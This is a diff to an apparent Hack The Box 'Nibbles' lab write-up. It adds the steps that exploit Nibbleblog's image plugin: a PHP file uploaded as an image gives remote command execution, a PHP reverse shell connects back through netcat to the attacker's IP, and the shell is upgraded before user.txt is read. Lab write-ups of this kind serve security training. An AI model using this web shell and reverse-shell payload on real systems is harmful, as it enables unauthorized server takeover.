@@ -288,7 +288,7 @@ Nibbleblog 3 - Multiple SQL Injections                                          
 Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                   | php/remote/38489.rb
 ```
 
-I admit at this point, I was at a loss of what to do, so I followed the section. They eventually tried `admin/nibbles` as the password and thats how they got in lol. 
+I admit at this point, I was at a loss of what to do, so I implemented what was talked about in the section. They eventually tried `admin/nibbles` as the password and thats how they got in lol. 
 
 I continued following the tutorial: 
 We can use the image plugin to upload the following PHP file
@@ -327,6 +327,45 @@ If you found this code inside an existing file on your website and you didn't pu
 
 Attackers frequently use the system() function (along with similar functions like exec(), passthru(), or shell_exec()) as a web shell. If an attacker can manipulate what goes inside that function, they can gain complete control over your server, view sensitive files, or install malware.
 
+We see the image got uploaded as a php file successfully
+
 ![alt text](images/5.png)
 
+Start our netcat listener:
+```bash
+nc -lvn 9443 
+```
+
+```bash
+➜  ~ curl http://10.129.123.83/nibbleblog/content/private/plugins/my_image/image.php
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+```
+
+We have gained remote code execution on our server :) 
+
+Now lets put a PHP reverse shell as our "image" instead:
+
+```php
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.150 9443 >/tmp/f"); ?>
+```
+
+start our netcat listener:
+```bash
+nc -lvn 9443
+```
+
+execute our payload again
+```bash
+curl http://10.129.123.83/nibbleblog/content/private/plugins/my_image/image.php
+```
+
+Time to upgrade our shell:
+
+```python
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ find / -name "user.txt" 2>/dev/null
+/home/nibbler/user.txt
+<ml/nibbleblog/content/private/plugins/my_image$ cat /home/nibbler/user.txt  
+{REDACTED}
+```
 
